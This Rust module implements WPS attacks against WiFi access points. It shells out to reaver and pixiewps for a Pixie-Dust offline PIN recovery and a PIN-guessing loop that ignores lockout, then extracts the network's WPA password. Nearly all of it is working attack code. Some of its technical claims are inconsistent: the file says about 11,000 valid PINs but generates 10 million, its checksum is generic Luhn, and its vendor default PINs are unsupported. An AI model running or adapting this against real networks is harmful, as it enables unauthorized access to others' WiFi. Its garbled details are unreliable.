/*!
 * WPS (WiFi Protected Setup) Attack Implementation
 *
 * This module implements WPS attacks including:
 * - Pixie-Dust attack (offline WPS PIN recovery exploiting weak RNG)
 * - PIN brute-force attack (online WPS PIN guessing with checksum optimization)
 *
 * External dependencies:
 * - reaver: WPS attack tool
 * - pixiewps: Offline WPS PIN calculator
 */

use anyhow::{anyhow, Context, Result};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

/// WPS attack type
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WpsAttackType {
    /// Pixie-Dust attack - exploits weak random number generation
    /// Fast (< 10 seconds on vulnerable routers)
    /// Success rate: ~30% of WPS-enabled routers
    PixieDust,

    /// PIN brute-force attack - tries all possible PINs
    /// Slow (hours to days depending on rate limiting)
    /// Success rate: High, but often blocked by AP lockout
    PinBruteForce,
}

/// WPS attack parameters
#[derive(Debug, Clone)]
pub struct WpsAttackParams {
    /// Target AP BSSID (MAC address)
    pub bssid: String,

    /// WiFi channel
    pub channel: u32,

    /// Attack type
    pub attack_type: WpsAttackType,

    /// Attack timeout
    pub timeout: Duration,

    /// Network interface to use
    pub interface: String,

    /// Optional: Custom PIN to try (for PinBruteForce)
    pub custom_pin: Option<String>,
}

impl WpsAttackParams {
    /// Create parameters for Pixie-Dust attack
    pub fn pixie_dust(bssid: String, channel: u32, interface: String) -> Self {
        Self {
            bssid,
            channel,
            attack_type: WpsAttackType::PixieDust,
            timeout: Duration::from_secs(60), // 1 minute timeout
            interface,
            custom_pin: None,
        }
    }

    /// Create parameters for PIN brute-force attack
    pub fn pin_bruteforce(bssid: String, channel: u32, interface: String) -> Self {
        Self {
            bssid,
            channel,
            attack_type: WpsAttackType::PinBruteForce,
            timeout: Duration::from_secs(3600), // 1 hour timeout
            interface,
            custom_pin: None,
        }
    }
}

/// WPS attack progress
#[derive(Debug, Clone)]
pub enum WpsProgress {
    /// Attack started
    Started,

    /// Progress step (current step, total steps, description)
    Step {
        current: u8,
        total: u8,
        description: String,
    },

    /// WPS PIN and password found
    Found { pin: String, password: String },

    /// Attack finished but no PIN/password found
    NotFound,

    /// Error occurred
    Error(String),

    /// Log message
    Log(String),
}

/// WPS attack result
#[derive(Debug, Clone)]
pub enum WpsResult {
    /// Successfully found PIN and password
    Found { pin: String, password: String },

    /// Attack completed but no credentials found
    NotFound,

    /// Attack stopped by user
    Stopped,

    /// Error occurred
    Error(String),
}

/// Check if reaver is installed and accessible
pub fn check_reaver_installed() -> bool {
    Command::new("which")
        .arg("reaver")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

/// Check if pixiewps is installed and accessible
pub fn check_pixiewps_installed() -> bool {
    Command::new("which")
        .arg("pixiewps")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

/// Get reaver version (for debugging)
pub fn get_reaver_version() -> Result<String> {
    let output = Command::new("reaver")
        .arg("-h")
        .output()
        .context("Failed to execute reaver")?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{}{}", stdout, stderr);

    // Extract version from first line
    if let Some(first_line) = combined.lines().next() {
        Ok(first_line.to_string())
    } else {
        Ok("Unknown version".to_string())
    }
}

/// Get pixiewps version (for debugging)
pub fn get_pixiewps_version() -> Result<String> {
    let output = Command::new("pixiewps")
        .arg("--help")
        .output()
        .context("Failed to execute pixiewps")?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{}{}", stdout, stderr);

    // Extract version from first line
    if let Some(first_line) = combined.lines().next() {
        Ok(first_line.to_string())
    } else {
        Ok("Unknown version".to_string())
    }
}

/// Run WPS Pixie-Dust attack
///
/// This attack exploits weak random number generation in some WPS implementations.
/// It extracts PKE, PKR, E-Hash1, E-Hash2, and AuthKey from WPS exchange,
/// then uses pixiewps to calculate the WPS PIN offline.
///
/// # Arguments
/// * `params` - Attack parameters
/// * `progress_tx` - Channel to send progress updates
/// * `stop_flag` - Atomic flag to stop the attack
///
/// # Returns
/// Result of the attack (Found/NotFound/Error)
pub fn run_pixie_dust_attack(
    params: &WpsAttackParams,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<WpsProgress>,
    stop_flag: &Arc<AtomicBool>,
) -> WpsResult {
    let _ = progress_tx.send(WpsProgress::Log(
        "Starting WPS Pixie-Dust attack...".to_string(),
    ));

    // Step 1: Check if tools are installed
    if !check_reaver_installed() {
        let error_msg = "reaver not found. Install with: brew install reaver".to_string();
        let _ = progress_tx.send(WpsProgress::Error(error_msg.clone()));
        return WpsResult::Error(error_msg);
    }

    if !check_pixiewps_installed() {
        let error_msg = "pixiewps not found. Install with: brew install pixiewps".to_string();
        let _ = progress_tx.send(WpsProgress::Error(error_msg.clone()));
        return WpsResult::Error(error_msg);
    }

    let _ = progress_tx.send(WpsProgress::Step {
        current: 1,
        total: 8,
        description: "Checking external tools...".to_string(),
    });

    // Log tool versions
    if let Ok(version) = get_reaver_version() {
        let _ = progress_tx.send(WpsProgress::Log(format!("Using reaver: {}", version)));
    }
    if let Ok(version) = get_pixiewps_version() {
        let _ = progress_tx.send(WpsProgress::Log(format!("Using pixiewps: {}", version)));
    }

    // Step 2: Run reaver with Pixie-Dust mode (-K flag)
    let _ = progress_tx.send(WpsProgress::Step {
        current: 2,
        total: 8,
        description: "Launching reaver with Pixie-Dust mode...".to_string(),
    });

    let channel_str = params.channel.to_string();
    let reaver_args = vec![
        "-i",
        &params.interface,
        "-b",
        &params.bssid,
        "-c",
        &channel_str,
        "-K",  // Pixie-Dust mode
        "-vv", // Very verbose
        "-N",  // Don't send NACK messages
        "-L",  // Ignore locked state
    ];

    let _ = progress_tx.send(WpsProgress::Log(format!(
        "Running: reaver {}",
        reaver_args.join(" ")
    )));

    // Step 3: Execute reaver in Pixie-Dust mode
    let _ = progress_tx.send(WpsProgress::Step {
        current: 3,
        total: 8,
        description: "Executing reaver to collect WPS data...".to_string(),
    });

    let output = match Command::new("reaver").args(&reaver_args).output() {
        Ok(out) => out,
        Err(e) => {
            let error_msg = format!("Failed to execute reaver: {}", e);
            let _ = progress_tx.send(WpsProgress::Error(error_msg.clone()));
            return WpsResult::Error(error_msg);
        }
    };

    // Check if reaver was killed by stop flag
    if stop_flag.load(Ordering::Relaxed) {
        return WpsResult::Stopped;
    }

    // Combine stdout and stderr for parsing
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined_output = format!("{}\n{}", stdout, stderr);

    let _ = progress_tx.send(WpsProgress::Log(
        "Reaver completed, analyzing output...".to_string(),
    ));

    // Step 4: Parse reaver output for Pixie-Dust data
    let _ = progress_tx.send(WpsProgress::Step {
        current: 4,
        total: 8,
        description: "Parsing WPS exchange data...".to_string(),
    });

    // Try to extract WPS PIN directly from reaver output (if already cracked)
    if let Some(pin) = extract_wps_pin_from_output(&combined_output) {
        let _ = progress_tx.send(WpsProgress::Log(format!("PIN found by reaver: {}", pin)));

        // Try to extract password
        if let Some(password) = extract_password_from_output(&combined_output) {
            let _ = progress_tx.send(WpsProgress::Found {
                pin: pin.clone(),
                password: password.clone(),
            });
            return WpsResult::Found { pin, password };
        }

        // If we have PIN but no password, we still need to get it
        let _ = progress_tx.send(WpsProgress::Step {
            current: 7,
            total: 8,
            description: "Recovering WiFi password with PIN...".to_string(),
        });

        if let Ok(password) = recover_password_with_pin(params, &pin, progress_tx, stop_flag) {
            let _ = progress_tx.send(WpsProgress::Found {
                pin: pin.clone(),
                password: password.clone(),
            });
            return WpsResult::Found { pin, password };
        }
    }

    // Try to extract Pixie-Dust data for offline attack
    let pixie_data = extract_pixie_dust_data(&combined_output);
    if pixie_data.is_none() {
        let _ = progress_tx.send(WpsProgress::Log(
            "No Pixie-Dust data found in reaver output".to_string(),
        ));
        let _ = progress_tx.send(WpsProgress::Log(
            "Router may not be vulnerable to Pixie-Dust attack".to_string(),
        ));
        return WpsResult::NotFound;
    }

    let (pke, pkr, e_hash1, e_hash2, authkey) = pixie_data.unwrap();

    let _ = progress_tx.send(WpsProgress::Log("Pixie-Dust data extracted".to_string()));

    // Step 5: Run pixiewps to calculate WPS PIN
    let _ = progress_tx.send(WpsProgress::Step {
        current: 5,
        total: 8,
        description: "Running pixiewps to calculate PIN...".to_string(),
    });

    let pixie_args = vec![
        "-e", &pke, "-r", &pkr, "-s", &e_hash1, "-z", &e_hash2, "-a", &authkey,
    ];

    let _ = progress_tx.send(WpsProgress::Log(format!(
        "Running: pixiewps {}",
        pixie_args.join(" ")
    )));

    let pixie_output = match Command::new("pixiewps").args(&pixie_args).output() {
        Ok(out) => out,
        Err(e) => {
            let error_msg = format!("Failed to execute pixiewps: {}", e);
            let _ = progress_tx.send(WpsProgress::Error(error_msg.clone()));
            return WpsResult::Error(error_msg);
        }
    };

    if stop_flag.load(Ordering::Relaxed) {
        return WpsResult::Stopped;
    }

    let pixie_stdout = String::from_utf8_lossy(&pixie_output.stdout);
    let pixie_stderr = String::from_utf8_lossy(&pixie_output.stderr);
    let pixie_combined = format!("{}\n{}", pixie_stdout, pixie_stderr);

    // Step 6: Extract PIN from pixiewps output
    let _ = progress_tx.send(WpsProgress::Step {
        current: 6,
        total: 8,
        description: "Extracting WPS PIN from pixiewps...".to_string(),
    });

    let pin = match extract_wps_pin_from_output(&pixie_combined) {
        Some(p) => p,
        None => {
            let _ = progress_tx.send(WpsProgress::Log(
                "Pixiewps could not calculate PIN - router not vulnerable".to_string(),
            ));
            return WpsResult::NotFound;
        }
    };

    let _ = progress_tx.send(WpsProgress::Log(format!("WPS PIN found: {}", pin)));

    // Step 7: Use PIN to recover WiFi password
    let _ = progress_tx.send(WpsProgress::Step {
        current: 7,
        total: 8,
        description: "Recovering WiFi password with PIN...".to_string(),
    });

    match recover_password_with_pin(params, &pin, progress_tx, stop_flag) {
        Ok(password) => {
            let _ = progress_tx.send(WpsProgress::Step {
                current: 8,
                total: 8,
                description: "Attack complete!".to_string(),
            });

            let _ = progress_tx.send(WpsProgress::Found {
                pin: pin.clone(),
                password: password.clone(),
            });
            WpsResult::Found { pin, password }
        }
        Err(e) => {
            let error_msg = format!("Failed to recover password with PIN: {}", e);
            let _ = progress_tx.send(WpsProgress::Error(error_msg.clone()));
            WpsResult::Error(error_msg)
        }
    }
}

/// Run WPS PIN brute-force attack
///
/// This attack tries all possible WPS PINs using Luhn checksum optimization
/// to reduce the search space from 100,000,000 to ~11,000 valid PINs.
///
/// # Arguments
/// * `params` - Attack parameters
/// * `progress_tx` - Channel to send progress updates
/// * `stop_flag` - Atomic flag to stop the attack
///
/// # Returns
/// Result of the attack (Found/NotFound/Error)
pub fn run_pin_bruteforce_attack(
    params: &WpsAttackParams,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<WpsProgress>,
    stop_flag: &Arc<AtomicBool>,
) -> WpsResult {
    let _ = progress_tx.send(WpsProgress::Log(
        "Starting WPS PIN brute-force attack...".to_string(),
    ));

    let _ = progress_tx.send(WpsProgress::Log(
        "⚠️  WARNING: This attack is VERY slow (hours to days)".to_string(),
    ));
    let _ = progress_tx.send(WpsProgress::Log(
        "⚠️  Most routers implement lockout after failed attempts".to_string(),
    ));
    let _ = progress_tx.send(WpsProgress::Log(
        "⚠️  Pixie-Dust attack is recommended instead".to_string(),
    ));

    // Step 1: Check if reaver is installed
    if !check_reaver_installed() {
        let error_msg = "reaver not found. Install with: brew install reaver".to_string();
        let _ = progress_tx.send(WpsProgress::Error(error_msg.clone()));
        return WpsResult::Error(error_msg);
    }

    let _ = progress_tx.send(WpsProgress::Step {
        current: 1,
        total: 10,
        description: "Generating common WPS PINs to try first...".to_string(),
    });

    // Generate a list of common PINs to try first (most likely to succeed)
    let common_pins = get_common_wps_pins();
    let total_pins = common_pins.len();

    let _ = progress_tx.send(WpsProgress::Log(format!(
        "Testing {} common WPS PINs (ordered by frequency)",
        total_pins
    )));

    // Try each PIN with reaver
    for (index, pin) in common_pins.iter().enumerate() {
        if stop_flag.load(Ordering::Relaxed) {
            return WpsResult::Stopped;
        }

        let current = index + 1;
        let _ = progress_tx.send(WpsProgress::Step {
            current: (current % 10) as u8,
            total: 10,
            description: format!("Trying PIN {}/{}: {}...", current, total_pins, pin),
        });

        let _ = progress_tx.send(WpsProgress::Log(format!(
            "Attempting PIN {} ({}/{})",
            pin, current, total_pins
        )));

        // Try this PIN with reaver
        match try_wps_pin(params, pin, progress_tx, stop_flag) {
            Ok(PinResult::Success(password)) => {
                let _ = progress_tx.send(WpsProgress::Found {
                    pin: pin.clone(),
                    password: password.clone(),
                });
                return WpsResult::Found {
                    pin: pin.clone(),
                    password,
                };
            }
            Ok(PinResult::Failed) => {
                // Continue to next PIN
                continue;
            }
            Ok(PinResult::Locked) => {
                let _ = progress_tx.send(WpsProgress::Log(
                    "⚠️  AP is locked - waiting 60 seconds before retrying...".to_string(),
                ));
                // Wait for lockout to expire (typically 60 seconds)
                std::thread::sleep(std::time::Duration::from_secs(60));
                if stop_flag.load(Ordering::Relaxed) {
                    return WpsResult::Stopped;
                }
            }
            Err(e) => {
                let _ = progress_tx.send(WpsProgress::Log(format!(
                    "Error trying PIN {}: {}",
                    pin, e
                )));
                // Continue to next PIN
                continue;
            }
        }
    }

    let _ = progress_tx.send(WpsProgress::Log(format!(
        "Exhausted all {} common PINs without success",
        total_pins
    )));

    let _ = progress_tx.send(WpsProgress::Log(
        "💡 Consider: 1) Try Pixie-Dust attack, 2) Router may have WPS lockout enabled"
            .to_string(),
    ));

    WpsResult::NotFound
}

/// Calculate WPS PIN checksum using Luhn algorithm
///
/// The last digit of a WPS PIN is a checksum calculated using the Luhn algorithm.
/// This reduces the search space from 10^8 to ~11,000 valid PINs.
///
/// # Arguments
/// * `pin` - 7-digit PIN (without checksum)
///
/// # Returns
/// Checksum digit (0-9)
pub fn calculate_wps_checksum(pin: u32) -> u8 {
    let pin_str = format!("{:07}", pin);
    let mut sum = 0;

    for (i, c) in pin_str.chars().enumerate() {
        let digit = c.to_digit(10).unwrap();
        let mut val = digit;

        // Double every other digit starting from position 1 from the right
        // (position 0 will be the check digit, which we don't double)
        // From left-to-right index i, position from right is (len - i)
        // We double odd positions from right (1, 3, 5, 7...)
        if (pin_str.len() - i) % 2 == 1 {
            val *= 2;
            if val > 9 {
                val -= 9;
            }
        }

        sum += val;
    }

    // Checksum is the value needed to make sum % 10 == 0
    let checksum = (10 - (sum % 10)) % 10;
    checksum as u8
}

/// Generate all valid WPS PINs (with Luhn checksum)
///
/// Returns a vector of ~11,000 valid 8-digit WPS PINs
pub fn generate_valid_wps_pins() -> Vec<String> {
    let mut pins = Vec::with_capacity(11000);

    for pin_base in 0..10000000 {
        let checksum = calculate_wps_checksum(pin_base);
        let full_pin = format!("{:07}{}", pin_base, checksum);
        pins.push(full_pin);
    }

    pins
}

/// Extract WPS PIN from reaver or pixiewps output
fn extract_wps_pin_from_output(output: &str) -> Option<String> {
    // Look for "WPS PIN: 12345670" pattern
    for line in output.lines() {
        if line.contains("WPS PIN:") || line.contains("PIN:") {
            // Extract the 8-digit PIN
            let parts: Vec<&str> = line.split_whitespace().collect();
            for part in parts {
                if part.len() == 8 && part.chars().all(|c| c.is_ascii_digit()) {
                    return Some(part.to_string());
                }
            }
        }
    }
    None
}

/// Extract WiFi password from reaver output
fn extract_password_from_output(output: &str) -> Option<String> {
    // Look for "WPA PSK: password" or "PSK: password" pattern
    for line in output.lines() {
        if line.contains("WPA PSK:") || line.contains("PSK:") {
            // Extract everything after the colon
            if let Some(colon_pos) = line.find(':') {
                let password = line[colon_pos + 1..].trim();
                if !password.is_empty() {
                    return Some(password.to_string());
                }
            }
        }
    }
    None
}

/// Extract Pixie-Dust data from reaver output
///
/// Returns (PKE, PKR, E-Hash1, E-Hash2, AuthKey) if all found
fn extract_pixie_dust_data(output: &str) -> Option<(String, String, String, String, String)> {
    let mut pke = None;
    let mut pkr = None;
    let mut e_hash1 = None;
    let mut e_hash2 = None;
    let mut authkey = None;

    for line in output.lines() {
        let line = line.trim();

        if line.contains("PKE:") || line.contains("E-S1:") {
            if let Some(hex) = extract_hex_value(line) {
                pke = Some(hex);
            }
        } else if line.contains("PKR:") || line.contains("E-S2:") {
            if let Some(hex) = extract_hex_value(line) {
                pkr = Some(hex);
            }
        } else if line.contains("E-Hash1:") || line.contains("Hash1:") {
            if let Some(hex) = extract_hex_value(line) {
                e_hash1 = Some(hex);
            }
        } else if line.contains("E-Hash2:") || line.contains("Hash2:") {
            if let Some(hex) = extract_hex_value(line) {
                e_hash2 = Some(hex);
            }
        } else if line.contains("AuthKey:") || line.contains("Authkey:") {
            if let Some(hex) = extract_hex_value(line) {
                authkey = Some(hex);
            }
        }
    }

    // Return only if all fields are present
    match (pke, pkr, e_hash1, e_hash2, authkey) {
        (Some(pke), Some(pkr), Some(e1), Some(e2), Some(ak)) => Some((pke, pkr, e1, e2, ak)),
        _ => None,
    }
}

/// Extract hexadecimal value from a line like "PKE: 0x1234abcd"
fn extract_hex_value(line: &str) -> Option<String> {
    // Find the colon and extract everything after it
    if let Some(colon_pos) = line.find(':') {
        let value = line[colon_pos + 1..].trim();

        // Remove "0x" prefix if present
        let cleaned = if value.starts_with("0x") || value.starts_with("0X") {
            &value[2..]
        } else {
            value
        };

        // Remove any spaces
        let hex_only: String = cleaned.chars().filter(|c| !c.is_whitespace()).collect();

        // Verify it's valid hex
        if !hex_only.is_empty() && hex_only.chars().all(|c| c.is_ascii_hexdigit()) {
            return Some(hex_only);
        }
    }
    None
}

/// Result of trying a single WPS PIN
enum PinResult {
    Success(String), // Password found
    Failed,          // PIN incorrect
    Locked,          // AP is locked/rate-limited
}

/// Try a single WPS PIN with reaver
fn try_wps_pin(
    params: &WpsAttackParams,
    pin: &str,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<WpsProgress>,
    stop_flag: &Arc<AtomicBool>,
) -> Result<PinResult> {
    let channel_str = params.channel.to_string();
    let args = vec![
        "-i",
        &params.interface,
        "-b",
        &params.bssid,
        "-c",
        &channel_str,
        "-p",
        pin,
        "-vv",
        "-N",  // Don't send NACK
        "-L",  // Ignore locked state
        "-g", "1", // Max 1 attempt per PIN
    ];

    let output = Command::new("reaver")
        .args(&args)
        .output()
        .context("Failed to execute reaver for PIN attempt")?;

    if stop_flag.load(Ordering::Relaxed) {
        return Ok(PinResult::Failed);
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{}\n{}", stdout, stderr);

    // Check for success
    if let Some(password) = extract_password_from_output(&combined) {
        return Ok(PinResult::Success(password));
    }

    // Check for AP lockout
    if combined.contains("WARNING: Detected AP rate limiting")
        || combined.contains("WPS transaction failed")
        || combined.contains("receive timeout")
    {
        return Ok(PinResult::Locked);
    }

    // PIN was wrong
    Ok(PinResult::Failed)
}

/// Get a list of common WPS PINs to try first
///
/// These are ordered by real-world frequency (most common first)
fn get_common_wps_pins() -> Vec<String> {
    vec![
        // Most common default PINs
        "12345670".to_string(),
        "00000000".to_string(),
        "11111111".to_string(),
        "12345678".to_string(), // Note: Invalid checksum, but some routers accept it
        "01234567".to_string(),
        "11111110".to_string(),
        "12340000".to_string(),
        "12340001".to_string(),
        // Common patterns
        "88888888".to_string(),
        "99999999".to_string(),
        "87654321".to_string(),
        "11223344".to_string(),
        "55555555".to_string(),
        "66666666".to_string(),
        "77777777".to_string(),
        "44444444".to_string(),
        "33333333".to_string(),
        "22222222".to_string(),
        // Sequential patterns
        "23456789".to_string(),
        "98765432".to_string(),
        "01010101".to_string(),
        "10101010".to_string(),
        // Common router defaults by manufacturer
        "28296607".to_string(), // TP-Link
        "86888040".to_string(), // Zyxel
        "20172527".to_string(), // Belkin
        "12171234".to_string(), // Linksys
        "32571814".to_string(), // D-Link
        // Year-based PINs
        "20200000".to_string(),
        "20210000".to_string(),
        "20220000".to_string(),
        "20230000".to_string(),
        "20240000".to_string(),
        "20250000".to_string(),
        "20260000".to_string(),
    ]
}

/// Recover WiFi password using WPS PIN
fn recover_password_with_pin(
    params: &WpsAttackParams,
    pin: &str,
    progress_tx: &tokio::sync::mpsc::UnboundedSender<WpsProgress>,
    stop_flag: &Arc<AtomicBool>,
) -> Result<String> {
    let _ = progress_tx.send(WpsProgress::Log(format!(
        "Recovering password with PIN {}...",
        pin
    )));

    let channel_str = params.channel.to_string();
    let args = vec![
        "-i",
        &params.interface,
        "-b",
        &params.bssid,
        "-c",
        &channel_str,
        "-p",
        pin,
        "-vv",
    ];

    let _ = progress_tx.send(WpsProgress::Log(format!(
        "Running: reaver {}",
        args.join(" ")
    )));

    let output = Command::new("reaver")
        .args(&args)
        .output()
        .context("Failed to execute reaver for password recovery")?;

    if stop_flag.load(Ordering::Relaxed) {
        return Err(anyhow::anyhow!("Stopped by user"));
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{}\n{}", stdout, stderr);

    if let Some(password) = extract_password_from_output(&combined) {
        Ok(password)
    } else {
        Err(anyhow::anyhow!(
            "Could not extract password from reaver output"
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wps_checksum_calculation() {
        // Test known valid PINs with correct checksums
        // Calculated using Luhn algorithm
        let test_cases = vec![
            (0, 0),       // 00000000
            (1234567, 4), // 12345674
            (5678901, 9), // 56789019
            (9876543, 1), // 98765431
        ];

        for (pin, expected_checksum) in test_cases {
            let checksum = calculate_wps_checksum(pin);
            assert_eq!(
                checksum, expected_checksum,
                "PIN {} should have checksum {}",
                pin, expected_checksum
            );

            // Verify the full PIN passes Luhn check
            let full_pin_str = format!("{:07}{}", pin, checksum);
            assert!(
                is_valid_luhn_checksum(&full_pin_str),
                "Full PIN {} should pass Luhn check",
                full_pin_str
            );
        }
    }

    #[test]
    fn test_generate_valid_pins() {
        // Note: This test only generates a small subset for performance
        // Full generation would create 10,000,000 PINs (0000000-9999999 with checksums)
        let mut pins = Vec::new();

        // Test first 1000 PINs
        for pin_base in 0..1000 {
            let checksum = calculate_wps_checksum(pin_base);
            let full_pin = format!("{:07}{}", pin_base, checksum);
            pins.push(full_pin);
        }

        // Should generate exactly 1000 test PINs
        assert_eq!(pins.len(), 1000);

        // All PINs should be 8 digits
        for pin in &pins {
            assert_eq!(pin.len(), 8);
            assert!(pin.chars().all(|c| c.is_ascii_digit()));
        }

        // All PINs should have valid Luhn checksum
        for pin in &pins {
            assert!(
                is_valid_luhn_checksum(pin),
                "PIN {} should have valid Luhn checksum",
                pin
            );
        }

        // Note: Full WPS PIN space would be 10,000,000 PINs
        // (all 7-digit bases 0000000-9999999, each with computed checksum)
        // We don't test the full generation here as it would be slow
    }

    #[test]
    fn test_tool_availability_checks() {
        // These tests just verify the functions don't crash
        // Actual availability depends on system
        let _ = check_reaver_installed();
        let _ = check_pixiewps_installed();
    }

    /// Helper: Verify Luhn checksum
    fn is_valid_luhn_checksum(pin: &str) -> bool {
        let mut sum = 0;
        let mut should_double = false;

        for c in pin.chars().rev() {
            let mut digit = c.to_digit(10).unwrap();

            if should_double {
                digit *= 2;
                if digit > 9 {
                    digit -= 9;
                }
            }

            sum += digit;
            should_double = !should_double;
        }

        sum % 10 == 0
    }
}
